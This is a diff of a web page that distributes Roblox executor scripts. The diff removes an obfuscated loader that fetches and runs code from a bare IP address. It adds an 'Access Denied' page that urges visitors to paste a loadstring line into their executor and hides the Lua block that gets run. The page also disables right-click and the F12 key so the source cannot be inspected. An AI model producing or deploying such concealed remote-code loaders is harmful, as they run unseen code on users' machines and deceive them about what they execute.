@@ -1,7 +1,96 @@
-<custom-lua>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access Denied | Secure API System</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            background: radial-gradient(circle at center, #1a1c24 0%, #0f1015 100%);
+            color: #ffffff; font-family: 'Segoe UI', sans-serif; 
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden;
+        }
+        body::before {
+            content: ''; position: absolute; width: 100%; height: 100%;
+            background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 20px 20px; z-index: 1;
+        }
+        .container {
+            position: relative; z-index: 2; max-width: 550px; width: 90%;
+            background: rgba(24, 26, 36, 0.8); border: 1px solid rgba(239, 68, 68, 0.2);
+            border-top: 4px solid #ef4444; padding: 40px 30px; border-radius: 12px; text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px);
+        }
+        .icon-wrapper {
+            width: 70px; height: 70px; background: rgba(239, 68, 68, 0.1);
+            border: 2px solid #ef4444; border-radius: 50%; display: flex;
+            justify-content: center; align-items: center; margin: 0 auto 25px;
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.2); animation: pulse 2s infinite;
+        }
+        .icon-wrapper svg { width: 35px; height: 35px; fill: #ef4444; }
+        h1 { font-size: 24px; color: #ef4444; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        p { color: #9ca3af; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+        .copy-box {
+            background: #11131c; border: 1px solid #2d3142; border-radius: 8px;
+            padding: 15px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; gap: 15px;
+        }
+        .code-text {
+            font-family: monospace; font-size: 13px; color: #38bdf8;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis; text-align: left; width: 100%;
+        }
+        .btn-copy {
+            background: #ef4444; color: white; border: none; padding: 10px 18px;
+            font-size: 14px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .btn-copy:hover { background: #dc2626; }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(239, 68, 68, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon-wrapper">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        </div>
+        <h1>Access Denied</h1>
+        <p>Direct source code access is strictly prohibited. This API endpoint is dedicated exclusively to automatic in-game execution. If you want to use this script, please copy the loadstring below into your executor.</p>
+        
+        <div class="copy-box">
+            <!-- Ô hiển thị dòng loadstring(A) tự động -->
+            <div class="code-text" id="scriptCode">loadstring(game:HttpGet(window.location.href))()</div>
+            <button class="btn-copy" onclick="copyScript()">
+                <span id="btnText">Copy</span>
+            </button>
+        </div>
+        <div style="font-size: 12px; color: #4b5563;">Secure Script Protection System &copy; 2026</div>
+    </div>
+
+    <!-- CODE BÍ MẬT ẨN BÊN TRONG (KHI ROBLOX ĐỌC WEB A THÌ SẼ CHẠY CODE B NÀY) -->
+    <custom-lua style="display:none;">
 --[[ Encrypted Roblox Script Protection ]]
-local _0x1a2b3c = "http://72.56.64.162/eMh2M4lsgnYDfhMfFCzWnuATNa7g2XNqgpkuxO80PrTpzC07JZPKNC6DIoqhLDysrzUXa1FXUepOlB5y"
-local _0x4d5e6f = "https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.20/yarhm.lua"
-loadstring(game:HttpGet(_0x1a2b3c))()
-loadstring(game:HttpGet(_0x4d5e6f, false))()
-</custom-lua>
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.20/yarhm.lua", false))()
+    </custom-lua>
+
+    <script>
+        // Tự lấy link web hiện tại điền vào khung sao chép
+        document.getElementById('scriptCode').innerText = 'loadstring(game:HttpGet("' + window.location.href + '"))()';
+
+        function copyScript() {
+            const codeText = document.getElementById('scriptCode').innerText;
+            navigator.clipboard.writeText(codeText).then(() => {
+                const btnText = document.getElementById('btnText');
+                btnText.innerText = 'Copied!';
+                setTimeout(() => { btnText.innerText = 'Copy'; }, 2000);
+            });
+        }
+        // Chặn click chuột phải và F12 tăng bảo mật cơ bản cho trang web
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) { if(e.keyCode == 123) return false; }
+    </script>
+</body>
+</html>
